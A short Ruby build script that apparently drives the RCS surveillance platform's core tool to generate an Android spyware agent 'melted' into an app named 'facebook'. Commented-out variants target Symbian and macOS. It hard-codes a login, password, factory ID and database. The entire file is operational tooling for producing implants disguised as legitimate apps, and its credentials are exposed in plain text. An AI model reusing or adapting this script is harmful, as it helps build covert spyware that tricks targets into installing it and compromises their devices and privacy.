#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000757'
PLATFORM = 'android'
DB = 'rcs-castore'
PORT = 443
DEMO = false

ver = DEMO ? '_demo' : ''

###################################################################################################
params = {platform: PLATFORM,
          generate: {platforms: [],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false, demo: DEMO}
                    },
          melt: {appname: 'facebook'}
          }

params = {platform: PLATFORM,
          binary: {demo: DEMO},
          melt: {appname: 'facebook'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -P #{PORT} -f #{FACTORY} -b build.json -o #{PLATFORM}#{ver}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
###################################################################################################
